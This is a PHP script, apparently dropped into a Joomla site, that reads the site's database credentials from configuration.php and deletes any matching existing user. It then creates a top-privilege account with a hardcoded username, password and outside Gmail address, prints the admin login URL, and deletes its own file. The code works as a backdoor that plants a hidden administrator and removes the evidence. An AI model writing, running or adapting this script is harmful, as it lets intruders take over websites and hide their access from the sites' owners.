<?php
/**
 * ============================================================
 * FILE: jomuser.php (Fixed - Multiple Connection Methods)
 * ============================================================
 */

// ===== Joomla Initialization =====
define('_JEXEC', 1);
define('JPATH_BASE', dirname(__DIR__));

// ===== Load Joomla configuration =====
$configFile = JPATH_BASE . '/configuration.php';
if (!file_exists($configFile)) {
    die("❌ Configuration file not found at: $configFile\n");
}

require_once $configFile;
$jConfig = new JConfig();

// ===== Try multiple connection methods =====
echo "🔍 Attempting to connect to database...\n";

// Method 1: Try with original host
try {
    $db = new PDO(
        "mysql:host={$jConfig->host};dbname={$jConfig->db};charset=utf8mb4",
        $jConfig->user,
        $jConfig->password,
        [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
    );
    echo "✅ Connected using host: {$jConfig->host}\n";
} catch (PDOException $e) {
    echo "⚠️ Failed with host '{$jConfig->host}': " . $e->getMessage() . "\n";
    
    // Method 2: Try localhost
    try {
        $db = new PDO(
            "mysql:host=localhost;dbname={$jConfig->db};charset=utf8mb4",
            $jConfig->user,
            $jConfig->password,
            [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
        );
        echo "✅ Connected using host: localhost\n";
    } catch (PDOException $e2) {
        echo "⚠️ Failed with localhost: " . $e2->getMessage() . "\n";
        
        // Method 3: Try 127.0.0.1
        try {
            $db = new PDO(
                "mysql:host=127.0.0.1;dbname={$jConfig->db};charset=utf8mb4",
                $jConfig->user,
                $jConfig->password,
                [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
            );
            echo "✅ Connected using host: 127.0.0.1\n";
        } catch (PDOException $e3) {
            die("❌ All connection attempts failed!\n");
        }
    }
}

$prefix = $jConfig->dbprefix;

// ===== Configuration =====
$newAdmin = [
    'name'     => 'Administrator',
    'username' => 'adminore',
    'password' => '@@//Adminof26',
    'email'    => 'ttest34030azk@gmail.com'
];
$adminGroupId = 8;

// ===== Validation =====
$errors = [];
foreach (['name', 'username', 'password', 'email'] as $field) {
    if (empty($newAdmin[$field])) $errors[] = "Field '$field' is required.";
}
if (!empty($newAdmin['email']) && !filter_var($newAdmin['email'], FILTER_VALIDATE_EMAIL)) {
    $errors[] = "Invalid email format.";
}
if (!empty($errors)) {
    echo "❌ Validation Errors:\n";
    foreach ($errors as $error) echo "   - $error\n";
    @unlink(__FILE__);
    exit;
}

// ===== Hash password =====
function hashPassword($password) {
    return password_hash($password, PASSWORD_BCRYPT, ['cost' => 10]);
}

// ===== Delete existing users =====
foreach (['username', 'email'] as $field) {
    $stmt = $db->prepare("SELECT id FROM {$prefix}users WHERE $field = ?");
    $stmt->execute([$newAdmin[$field]]);
    $id = $stmt->fetchColumn();
    if ($id) {
        echo "⚠️ Deleting existing user (ID: $id)...\n";
        $db->prepare("DELETE FROM {$prefix}users WHERE id = ?")->execute([$id]);
        $db->prepare("DELETE FROM {$prefix}user_usergroup_map WHERE user_id = ?")->execute([$id]);
    }
}

// ===== Create user =====
echo "🔄 Creating Administrator user...\n";

try {
    $hashedPassword = hashPassword($newAdmin['password']);
    $now = date('Y-m-d H:i:s');
    
    $sql = "INSERT INTO {$prefix}users (
        name, username, email, password, block, sendEmail, 
        registerDate, lastvisitDate, activation, params
    ) VALUES (?, ?, ?, ?, 0, 0, ?, '0000-00-00 00:00:00', '', '')";
    
    $stmt = $db->prepare($sql);
    $stmt->execute([
        $newAdmin['name'],
        $newAdmin['username'],
        $newAdmin['email'],
        $hashedPassword,
        $now
    ]);
    
    $userId = $db->lastInsertId();
    
    $stmt = $db->prepare("INSERT INTO {$prefix}user_usergroup_map (user_id, group_id) VALUES (?, ?)");
    $stmt->execute([$userId, $adminGroupId]);
    
    echo "\n✅ ==========================================\n";
    echo "✅ ADMINISTRATOR CREATED SUCCESSFULLY!\n";
    echo "✅ ==========================================\n";
    echo "👤 Name    : " . $newAdmin['name'] . "\n";
    echo "🔑 Username: " . $newAdmin['username'] . "\n";
    echo "🔐 Password: " . $newAdmin['password'] . "\n";
    echo "📧 Email   : " . $newAdmin['email'] . "\n";
    echo "🆔 User ID : " . $userId . "\n";
    echo "📋 Group   : Administrator\n";
    echo "✅ ==========================================\n";
    
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $basePath = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
    $basePath = str_replace('/tmp', '', $basePath);
    
    echo "\n🌐 Login: $protocol://$host$basePath/administrator\n";
    echo "   👤 $newAdmin[username]\n";
    echo "   🔐 $newAdmin[password]\n";
    echo "\n⚠️ CHANGE PASSWORD AFTER LOGIN!\n";
    echo "✅ ==========================================\n";
    
} catch (PDOException $e) {
    echo "❌ Database error: " . $e->getMessage() . "\n";
}

@unlink(__FILE__);
echo "\n🧹 File deleted.\n";
exit;
?>
